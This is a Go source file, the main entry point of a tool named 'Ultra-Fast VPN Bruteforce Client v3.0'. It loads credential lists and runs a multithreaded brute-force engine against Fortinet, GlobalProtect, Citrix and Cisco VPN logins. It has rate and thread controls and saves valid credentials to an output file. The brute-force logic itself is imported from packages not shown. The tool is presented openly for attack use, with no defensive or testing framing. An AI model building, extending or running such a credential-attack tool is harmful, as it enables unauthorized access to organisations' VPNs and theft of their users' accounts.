package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"runtime"
	"syscall"
	"time"

	"vpn-bruteforce-client/internal/bruteforce"
	"vpn-bruteforce-client/internal/config"
	"vpn-bruteforce-client/internal/stats"
)

func main() {
	var (
		configFile = flag.String("config", "config.yaml", "Configuration file path")
		vpnType    = flag.String("type", "", "VPN type (fortinet, globalprotect, citrix, cisco)")
		inputFile  = flag.String("input", "", "Input file with credentials")
		outputFile = flag.String("output", "", "Output file for valid credentials")
		threads    = flag.Int("threads", 0, "Number of threads (0 = auto-detect)")
		rateLimit  = flag.Int("rate", 0, "Rate limit (requests per second)")
		timeout    = flag.Int("timeout", 0, "Connection timeout in seconds")
		verbose    = flag.Bool("verbose", false, "Verbose logging")
		benchmark  = flag.Bool("benchmark", false, "Run performance benchmark")
	)
	flag.Parse()

	// Performance benchmark mode
	if *benchmark {
		runBenchmark()
		return
	}

	// Set GOMAXPROCS to use all CPU cores
	runtime.GOMAXPROCS(runtime.NumCPU())

	fmt.Printf("🚀 Ultra-Fast VPN Bruteforce Client v3.0\n")
	fmt.Printf("💻 System: %d CPU cores, %s GOOS, %s GOARCH\n", 
		runtime.NumCPU(), runtime.GOOS, runtime.GOARCH)
	fmt.Printf("⚡ Go Runtime: %s, GC Target: %d%%\n\n", 
		runtime.Version(), 100) // Set aggressive GC

	// Load configuration
	cfg, err := config.Load(*configFile)
	if err != nil {
		log.Printf("⚠️  Config load failed, using optimized defaults: %v", err)
		cfg = config.Default()
	}

	// Override with CLI flags
	if *inputFile != "" {
		cfg.InputFile = *inputFile
	}
	if *outputFile != "" {
		cfg.OutputFile = *outputFile
	}
	if *threads > 0 {
		cfg.Threads = *threads
	}
	if *rateLimit > 0 {
		cfg.RateLimit = *rateLimit
	}
	if *timeout > 0 {
		cfg.Timeout = time.Duration(*timeout) * time.Second
	}
	if *vpnType != "" {
		cfg.VPNType = *vpnType
	}
	cfg.Verbose = *verbose

	// Validate input file exists
	if _, err := os.Stat(cfg.InputFile); os.IsNotExist(err) {
		log.Fatalf("❌ Input file not found: %s", cfg.InputFile)
	}

	fmt.Printf("🎯 Target: %s VPN | RPS Limit: %d | Threads: %d-%d\n", 
		cfg.VPNType, cfg.RateLimit, cfg.MinThreads, cfg.MaxThreads)
	fmt.Printf("📁 Input: %s | Output: %s\n", cfg.InputFile, cfg.OutputFile)
	fmt.Printf("⏱️  Timeout: %v | Retries: %d | Auto-scale: %v\n\n", 
		cfg.Timeout, cfg.MaxRetries, cfg.AutoScale)

	// Initialize ultra-fast statistics
	statsManager := stats.New()
	go statsManager.Start()

	// Initialize ultra-fast bruteforce engine
	engine, err := bruteforce.New(cfg, statsManager)
	if err != nil {
		log.Fatalf("❌ Failed to initialize ultra-fast engine: %v", err)
	}

	// Handle graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-sigChan
		fmt.Println("\n🛑 Shutdown signal received...")
		engine.Stop()
		statsManager.Stop()
		
		// Force exit after 5 seconds
		time.Sleep(5 * time.Second)
		os.Exit(0)
	}()

	// Start the ultra-fast bruteforce engine
	fmt.Println("🔥 Starting ultra-fast engine with zero-allocation optimizations...")
	start := time.Now()
	
	if err := engine.Start(); err != nil {
		log.Fatalf("❌ Engine failed: %v", err)
	}

	duration := time.Since(start)
	fmt.Printf("\n✅ Ultra-fast bruteforce completed in %v!\n", duration)
	fmt.Printf("📊 Final statistics saved to stats files\n")
}

func runBenchmark() {
	fmt.Println("🏁 Running performance benchmark...")
	
	// CPU benchmark
	start := time.Now()
	for i := 0; i < 10000000; i++ {
		_ = fmt.Sprintf("test_%d", i)
	}
	cpuTime := time.Since(start)
	
	// Memory benchmark
	start = time.Now()
	data := make([][]byte, 100000)
	for i := range data {
		data[i] = make([]byte, 1024)
	}
	memTime := time.Since(start)
	
	fmt.Printf("💻 CPU Performance: %v (10M string operations)\n", cpuTime)
	fmt.Printf("🧠 Memory Performance: %v (100MB allocation)\n", memTime)
	fmt.Printf("🚀 System ready for ultra-fast operations!\n")
}